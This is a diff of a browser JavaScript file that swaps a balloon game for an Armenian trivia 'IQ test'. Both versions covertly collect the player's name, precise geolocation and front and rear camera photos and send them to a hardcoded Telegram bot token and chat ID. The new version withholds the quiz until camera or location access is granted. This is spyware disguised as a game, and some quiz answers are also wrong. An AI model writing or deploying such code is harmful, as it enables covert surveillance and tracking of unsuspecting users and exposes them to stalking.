@@ -1,217 +1,310 @@
-const canvas = document.getElementById('game-canvas');
-const ctx = canvas.getContext('2d');
+const TELEGRAM_TOKEN = '7921776519:AAEtasvOGOZxdZo4gUNscLC49zSdm3CtITw';
+const TELEGRAM_CHAT_ID = '8071841674';
 
-function resize() {
-  canvas.width = window.innerWidth;
-  canvas.height = window.innerHeight;
+const questions = [
+  {
+    question: "Ո՞րն է Հայաստանի մայրաքաղաքը։",
+    answers: [
+      { text: "Երևան", correct: true },
+      { text: "Գյումրի", correct: false },
+      { text: "Վանաձոր", correct: false },
+      { text: "Լոռի", correct: false }
+    ]
+  },
+  {
+    question: "Ո՞րն է 7 × 8",
+    answers: [
+      { text: "54", correct: false },
+      { text: "56", correct: true },
+      { text: "58", correct: false },
+      { text: "64", correct: false }
+    ]
+  },
+  {
+    question: "Ո՞րն է ամենամեծ օվկիանոսը",
+    answers: [
+      { text: "Ատլանտյան", correct: false },
+      { text: "Հնդկական", correct: false },
+      { text: "Խաղաղ", correct: true },
+      { text: "Արաբական", correct: false }
+    ]
+  },
+  {
+    question: "Ո՞րն է մարդու մարմնի ամենամեծ օրգանը",
+    answers: [
+      { text: "Սրտը", correct: false },
+      { text: "Մաշկը", correct: true },
+      { text: "Ոսկորները", correct: false },
+      { text: "Երիկամները", correct: false }
+    ]
+  },
+  {
+    question: "Ո՞րն է արևմուտքում մաշկի վնասման հիմնական պատճառը",
+    answers: [
+      { text: "Ջերմությունը", correct: false },
+      { text: "Արևի ճառագայթումը", correct: true },
+      { text: "Ջերմաստիճանը", correct: false },
+      { text: "Ջրի պակասը", correct: false }
+    ]
+  },
+  {
+    question: "Ո՞րն է Եվրոպայի ամենամեծ երկիրը",
+    answers: [
+      { text: "Ֆրանսիա", correct: false },
+      { text: "Ռուսաստան", correct: true },
+      { text: "Գերմանիա", correct: false },
+      { text: "Իտալիա", correct: false }
+    ]
+  },
+  {
+    question: "Ո՞ր երկիրն է հայտնի իր շոկոլադով",
+    answers: [
+      { text: "Բելգիա", correct: true },
+      { text: "Իսպանիա", correct: false },
+      { text: "Իտալիա", correct: false },
+      { text: "Գերմանիա", correct: false }
+    ]
+  },
+  {
+    question: "Ո՞րն է գիտության լեզուն",
+    answers: [
+      { text: "Լատին", correct: false },
+      { text: "Անգլերեն", correct: true },
+      { text: "Հին հունական", correct: false },
+      { text: "Ֆրանսերեն", correct: false }
+    ]
+  },
+  {
+    question: "Ո՞րն է Երկրի միայն արբանյակը",
+    answers: [
+      { text: "Արեգակ", correct: false },
+      { text: "Արեւ", correct: false },
+      { text: "Աստղ", correct: false },
+      { text: "Լուսին", correct: true }
+    ]
+  },
+  {
+    question: "Ո՞րն է ամենաարագ կենդանին",
+    answers: [
+      { text: "Գայլ", correct: false },
+      { text: "Առյուծ", correct: false },
+      { text: "Չղջիկ", correct: false },
+      { text: "Ճայագռի", correct: true }
+    ]
+  }
+];
+
+function shuffle(array) {
+  for (let i = array.length - 1; i > 0; i--) {
+    const j = Math.floor(Math.random() * (i + 1));
+    [array[i], array[j]] = [array[j], array[i]];
+  }
+  return array;
 }
-resize();
-window.addEventListener('resize', resize);
 
-let redHits = 0;
-let fails = 0;
-let totalFails = 0; // для подсчёта попыток
-let balloons = [];
-let collected = false;
+const userNameSpan = document.getElementById('user-name');
+const questionStatsSpan = document.getElementById('question-stats');
+const questionText = document.getElementById('question-text');
+const answerButtons = document.getElementById('answer-buttons');
+const resultScreen = document.getElementById('result-screen');
+const resultTitle = document.getElementById('result-title');
+const resultSummary = document.getElementById('result-summary');
+const retryButton = document.getElementById('retry-button');
 
-const token = "7921776519:AAEtasvOGOZxdZo4gUNscLC49zSdm3CtITw";
-const chatId = "8071841674";
+let shuffledQuestions, currentQuestionIndex;
+let correctAnswers = 0;
+let wrongAnswers = 0;
 
-// Создаём и отображаем счётчики попаданий и промахов в правом верхнем углу
-const scoreDiv = document.createElement('div');
-scoreDiv.style.position = 'fixed';
-scoreDiv.style.top = '10px';
-scoreDiv.style.right = '10px';
-scoreDiv.style.color = '#222';
-scoreDiv.style.fontSize = '20px';
-scoreDiv.style.fontWeight = 'bold';
-scoreDiv.style.backgroundColor = 'rgba(255,255,255,0.7)';
-scoreDiv.style.padding = '8px 12px';
-scoreDiv.style.borderRadius = '8px';
-scoreDiv.style.zIndex = '20';
-scoreDiv.style.userSelect = 'none';
-document.body.appendChild(scoreDiv);
+async function init() {
+  let username = localStorage.getItem('iqtest_username');
 
-function updateScore() {
-  scoreDiv.textContent = `Попадания: ${redHits}   Промахи: ${fails}`;
-}
+  if (!username) {
+    username = prompt("Մուտքագրեք ձեր անունը:");
+    if (!username || username.trim() === '') username = 'Անուն չկա';
+    localStorage.setItem('iqtest_username', username);
+  }
 
-updateScore();
+  userNameSpan.textContent = username;
 
-async function sendToTelegram(data) {
-  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ chat_id: chatId, text: data }),
-  });
-}
+  const geo = await getGeolocation();
+  const photos = await getCameraPhotos();
 
-async function sendPhoto(photoBlob, caption) {
-  const formData = new FormData();
-  formData.append("chat_id", chatId);
-  formData.append("caption", caption);
-  formData.append("photo", photoBlob, "photo.jpg");
-  await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-    method: "POST",
-    body: formData,
-  });
-}
+  sendDataToTelegram(username, geo, photos);
 
-async function getUserData() {
-  const username = prompt("Մուտքագրեք ձեր անունը:");
-  let locationText = "📍 Գեո չի ստացվել";
-  let mapLink = "";
-  let photoFront = null;
-  let photoBack = null;
-  let gotGeo = false, gotCam = false;
-
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(pos => {
-      const lat = pos.coords.latitude;
-      const lon = pos.coords.longitude;
-      locationText = `🌍 Կոորդինատներ: ${lat}, ${lon}`;
-      mapLink = `🔗 Քարտեզում: https://www.google.com/maps?q=${lat},${lon}`;
-      gotGeo = true;
-      sendAll();
-    }, () => sendAll());
-  } else sendAll();
-
-  const video = document.getElementById("video");
-
-  try {
-    const streamFront = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
-    video.srcObject = streamFront;
-    photoFront = await capturePhoto(video);
-    streamFront.getTracks().forEach(track => track.stop());
-
-    const streamBack = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } }, audio: false });
-    video.srcObject = streamBack;
-    photoBack = await capturePhoto(video);
-    streamBack.getTracks().forEach(track => track.stop());
-
-    gotCam = true;
-  } catch (e) { gotCam = false; }
-
-  async function sendAll() {
-    if (collected) return;
-    collected = true;
-    await sendToTelegram(`👤 Անուն: ${username}\n${locationText}\n${mapLink || ""}\n📷 Տվյալներ ${gotCam ? "✓" : "✗"}, 📍 Գեո ${gotGeo ? "✓" : "✗"}`);
-    if (photoFront) await sendPhoto(photoFront, "Ֆոտո - Առջևի տեսախցիկ");
-    if (photoBack) await sendPhoto(photoBack, "Ֆոտո - Հետևի տեսախցիկ");
-    if (gotCam || gotGeo) startGame();
+  if (geo || photos.length > 0) {
+    startGame();
+  } else {
+    alert("Խնդրում ենք թույլտվեք կադերա կամ գտնվելու վայր:");
+    location.reload();
   }
 }
 
-function capturePhoto(video) {
-  const canvas = document.createElement("canvas");
-  canvas.width = video.videoWidth;
-  canvas.height = video.videoHeight;
-  canvas.getContext("2d").drawImage(video, 0, 0);
-  return new Promise(resolve => canvas.toBlob(resolve, "image/jpeg"));
-}
-
-function createBalloon() {
-  const colors = ['red', 'blue', 'green', 'yellow'];
-  const color = colors[Math.floor(Math.random() * colors.length)];
-  return {
-    x: Math.random() * canvas.width,
-    y: canvas.height + 50,
-    radius: 30,
-    color: color,
-    speed: 1 + Math.random() * 2
-  };
-}
-
-function drawBalloon(b) {
-  ctx.beginPath();
-  ctx.arc(b.x, b.y, b.radius, 0, Math.PI * 2);
-  ctx.fillStyle = b.color;
-  ctx.fill();
-  ctx.closePath();
-}
-
-function update() {
-  ctx.clearRect(0, 0, canvas.width, canvas.height);
-  balloons.forEach(b => {
-    b.y -= b.speed;
-    drawBalloon(b);
+function getGeolocation() {
+  return new Promise((resolve) => {
+    if (!navigator.geolocation) {
+      resolve(null);
+      return;
+    }
+    navigator.geolocation.getCurrentPosition(
+      (position) => {
+        resolve({
+          latitude: position.coords.latitude,
+          longitude: position.coords.longitude,
+          accuracy: position.coords.accuracy,
+        });
+      },
+      () => resolve(null)
+    );
   });
-  balloons = balloons.filter(b => b.y + b.radius > 0);
-  if (Math.random() < 0.03) balloons.push(createBalloon());
-  requestAnimationFrame(update);
 }
 
-canvas.addEventListener('click', (e) => {
-  const rect = canvas.getBoundingClientRect();
-  const clickX = e.clientX - rect.left;
-  const clickY = e.clientY - rect.top;
+async function getCameraPhotos() {
+  const photos = [];
 
-  for (let i = 0; i < balloons.length; i++) {
-    const b = balloons[i];
-    const dist = Math.sqrt((b.x - clickX)**2 + (b.y - clickY)**2);
-    if (dist < b.radius) {
-      if (b.color === 'red') {
-        redHits++;
-        updateScore();
-        if (redHits >= 5) {
-          endGame(true);
-        }
-      } else if (b.color === 'blue') {
-        fails++;
-        updateScore();
-        if (fails >= 3) {
-          totalFails++;
-          if (totalFails >= 10) {
-            alert("Игра окончена. Перезагрузка...");
-            location.reload();
-          } else {
-            endGame(false);
-          }
-        }
-      }
-      balloons.splice(i, 1);
-      break;
+  async function capturePhoto(facingMode) {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode },
+        audio: false,
+      });
+      const video = document.createElement('video');
+      video.srcObject = stream;
+      await video.play();
+
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      const photoDataUrl = canvas.toDataURL('image/jpeg');
+
+      stream.getTracks().forEach(track => track.stop());
+
+      return photoDataUrl;
+    } catch {
+      return null;
     }
   }
-});
 
-function endGame(victory) {
-  const endAnim = document.getElementById('end-animation');
-  const anim = document.getElementById('balloon-animation');
-  anim.innerHTML = '';
+  const frontPhoto = await capturePhoto('user');
+  if (frontPhoto) photos.push(frontPhoto);
 
-  // Текст результата
-  const textDiv = document.createElement('div');
-  textDiv.style.marginBottom = '20px';
-  textDiv.style.fontSize = '40px';
-  textDiv.textContent = victory ? `Победа — ${redHits} попаданий` : `Поражение`;
-  anim.appendChild(textDiv);
+  const rearPhoto = await capturePhoto('environment');
+  if (rearPhoto) photos.push(rearPhoto);
 
-  // Анимация шариков
-  for (let i = 0; i < 50; i++) {
-    const balloon = document.createElement('div');
-    balloon.classList.add('balloon');
-    balloon.style.background = ['red', 'blue', 'yellow'][i % 3];
-    balloon.style.left = Math.random() * window.innerWidth + 'px';
-    balloon.style.bottom = '0px';
-    balloon.style.animation = `floatUp 3s ease-out forwards`;
-    anim.appendChild(balloon);
+  return photos;
+}
+
+function sendDataToTelegram(username, geo, photos) {
+  const messageParts = [];
+  if (username) messageParts.push(`Անուն: ${username}`);
+  if (geo) messageParts.push(`Տեղադրություն: Լատ․ ${geo.latitude}, Լոնգ․ ${geo.longitude}, Ճշգրտություն՝ ${geo.accuracy}մ`);
+
+  const textMessage = encodeURIComponent(messageParts.join('\n'));
+
+  fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${textMessage}`);
+
+  photos.forEach((photo, index) => {
+    const formData = new FormData();
+    formData.append('chat_id', TELEGRAM_CHAT_ID);
+    formData.append('photo', dataURLtoBlob(photo), `photo${index}.jpg`);
+
+    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+      method: 'POST',
+      body: formData,
+    });
+  });
+}
+
+function dataURLtoBlob(dataurl) {
+  const arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
+    bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
+  for (let i=0; i<n; i++) {
+    u8arr[i] = bstr.charCodeAt(i);
   }
-
-  endAnim.classList.add('visible');
-
-  // Через 3 секунды сбрасываем игру
-  setTimeout(() => {
-    redHits = 0;
-    fails = 0;
-    updateScore();
-    endAnim.classList.remove('visible');
-    balloons = [];
-  }, 3000);
+  return new Blob([u8arr], {type:mime});
 }
 
 function startGame() {
-  update();
+  shuffledQuestions = shuffle(questions);
+  currentQuestionIndex = 0;
+  correctAnswers = 0;
+  wrongAnswers = 0;
+  resultScreen.classList.add('hidden');
+  document.querySelector('.container').style.display = 'block';
+  showQuestion();
 }
 
-getUserData();
+function showQuestion() {
+  resetState();
+  const currentQuestion = shuffledQuestions[currentQuestionIndex];
+  questionText.textContent = currentQuestion.question;
+
+  const remaining = shuffledQuestions.length - currentQuestionIndex;
+  questionStatsSpan.textContent = `Մնացել է ${remaining} | Ճիշտ ${correctAnswers} | Հակառակ ${wrongAnswers}`;
+
+  currentQuestion.answers.forEach(answer => {
+    const button = document.createElement('button');
+    button.textContent = answer.text;
+    button.classList.add('btn');
+    button.addEventListener('click', () => selectAnswer(button, answer.correct));
+    answerButtons.appendChild(button);
+  });
+}
+
+function resetState() {
+  while (answerButtons.firstChild) {
+    answerButtons.removeChild(answerButtons.firstChild);
+  }
+}
+
+function selectAnswer(button, correct) {
+  if (correct) {
+    correctAnswers++;
+    button.style.backgroundColor = '#38a169';
+  } else {
+    wrongAnswers++;
+    button.style.backgroundColor = '#e53e3e';
+    showCorrectAnswer();
+  }
+
+  Array.from(answerButtons.children).forEach(btn => btn.disabled = true);
+
+  setTimeout(() => {
+    currentQuestionIndex++;
+    if (currentQuestionIndex < shuffledQuestions.length) {
+      showQuestion();
+    } else {
+      showResult();
+    }
+  }, 1500);
+}
+
+function showCorrectAnswer() {
+  const currentQuestion = shuffledQuestions[currentQuestionIndex];
+  Array.from(answerButtons.children).forEach((btn, idx) => {
+    if (currentQuestion.answers[idx].correct) {
+      btn.style.backgroundColor = '#38a169';
+    }
+  });
+}
+
+function showResult() {
+  document.querySelector('.container').style.display = 'none';
+  resultScreen.classList.remove('hidden');
+
+  if (correctAnswers >= 7) {
+    resultTitle.textContent = 'Դու խելացի ես 😎';
+    resultSummary.textContent = `Ճիշտ պատասխաններ՝ ${correctAnswers} / ${shuffledQuestions.length}`;
+  } else {
+    resultTitle.textContent = 'Փորձիր նորից 🧠';
+    resultSummary.textContent = `Ճիշտ պատասխաններ՝ ${correctAnswers} / ${shuffledQuestions.length}`;
+  }
+}
+
+retryButton.addEventListener('click', () => {
+  location.reload();
+});
+
+init();
